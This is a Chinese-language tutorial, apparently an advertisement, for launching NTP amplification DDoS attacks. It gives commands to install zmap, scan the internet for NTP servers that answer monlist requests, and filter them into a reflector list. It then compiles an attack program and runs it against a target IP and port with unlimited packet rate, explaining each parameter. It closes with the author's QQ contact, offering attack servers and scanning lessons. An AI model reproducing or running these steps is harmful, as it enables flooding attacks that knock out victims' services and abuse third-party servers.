更新您的服务器
yum -y update

安装repositorys

CentOS 6：
wget http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm
sudo rpm -Uvh epel-release-6-8.noarch.rpm

Centos 7:
wget http://dl.fedoraproject.org/pub/epel/7/x86_64/e/epel-release-7-8.noarch.rpm
sudo rpm -Uvh epel-release-7-5.noarch.rpm

安装依赖环境
yum install gcc libcap  libpcap libpcap-devel screen php dstat cmake gmp gmp-devel gengetopt byacc flex git json-c

安装ZMAP
yum -y install zmap


ntpchecker―上传到你的服务器
ntp_123_monlist.pkt―上传到你的服务器

开始扫描放大列表
screen zmap -p 123 -M udp --probe-args=file:/root/ntp_123_monlist.pkt -o monlist_fingerprint.txt
这个过程相当长的请等待。

给ntpchecker权限
chmod 777 ntpchecker

运行检查
screen ./ntpchecker monlist_fingerprint.txt step1.txt 1 0 1

过滤列表
awk '$2>419{print $1}' step1.txt | sort -n | uniq | sort -R > ntpamp.txt



编译与攻击


服务器终端和类型
yum install gcc libcap libpcap libpcap-devel 

编译脚本
gcc -lpthread ntp.c -lpcap -o ntp 

./ntp 127.0.0.1 80 ntpamp.txt 1500 -1 100

攻击命令解释
127.0.0.1=目标IP
80=攻击端口
ntpamp.txt=过滤后的放大列表
1500=线程
-1=pps限制，-1表示无限制
100=攻击时间

作者QQ156740798 PS：出发包机，包更新和环境，教扫描。